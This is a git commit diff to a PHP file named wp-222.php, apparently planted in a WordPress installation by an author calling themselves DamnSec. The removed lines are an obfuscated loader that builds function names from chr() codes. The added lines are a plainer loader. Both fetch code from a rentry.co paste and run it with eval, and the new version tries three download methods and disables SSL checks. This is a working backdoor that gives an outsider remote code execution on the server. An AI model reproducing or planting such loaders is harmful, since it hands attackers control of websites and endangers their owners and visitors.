7573f30a17f9bb25e83d8c9922302db05e4f8cda
DamnSec <btc04@protonmail.com>
2024-10-22 10:17:23 +0700

    Update wp-222.php

--- wp-222.php
+++ wp-222.php
@@ -1,3 +1,50 @@
 <?php
-$__aB="https://rentry.co/wp-222/raw";$__B=chr(102).chr(105).chr(108).chr(101).chr(95).chr(103).chr(101).chr(116).chr(95).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(115);$__C=chr(99).chr(117).chr(114).chr(108).chr(95).chr(105).chr(110).chr(105).chr(116);$__D=chr(99).chr(117).chr(114).chr(108).chr(95).chr(115).chr(101).chr(116).chr(111).chr(112).chr(116);$__E=chr(99).chr(117).chr(114).chr(108).chr(95).chr(101).chr(120).chr(101).chr(99);$__F=chr(99).chr(117).chr(114).chr(108).chr(95).chr(99).chr(108).chr(111).chr(115).chr(101);eval('$getContent=function($url)use($__B,$__C,$__D,$__E,$__F){if(function_exists($__B)){return $__B($url);}elseif(function_exists($__C)){$ch=$__C();$__D($ch,CURLOPT_URL,$url);$__D($ch,CURLOPT_RETURNTRANSFER,true);$output=$__E($ch);$__F($ch);return$output;}else{return false;}};');$code=$getContent($__aB);if($code!==false){eval("?>".$code);}else{echo"Error: Tidak dapat mengambil konten dari URL.";}
+$url = "https://rentry.co/wp-22/raw";
+
+function get_with_file_get_contents($url) {
+    if (ini_get('allow_url_fopen')) {
+        return file_get_contents($url);
+    } else {
+        return false;
+    }
+}
+
+function get_with_curl($url) {
+    if (function_exists('curl_version')) {
+        $ch = curl_init($url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        $data = curl_exec($ch);
+        curl_close($ch);
+        return $data;
+    } else {
+        return false;
+    }
+}
+
+function get_with_streams($url) {
+    if ($stream = fopen($url, 'r')) {
+        $data = stream_get_contents($stream);
+        fclose($stream);
+        return $data;
+    } else {
+        return false;
+    }
+}
+
+$content = get_with_file_get_contents($url);
+
+if ($content === false) {
+    $content = get_with_curl($url);
+}
+
+if ($content === false) {
+    $content = get_with_streams($url);
+}
+
+if ($content !== false) {
+    eval("?>".$content);
+} else {
+    echo "Error.";
+}
 ?>
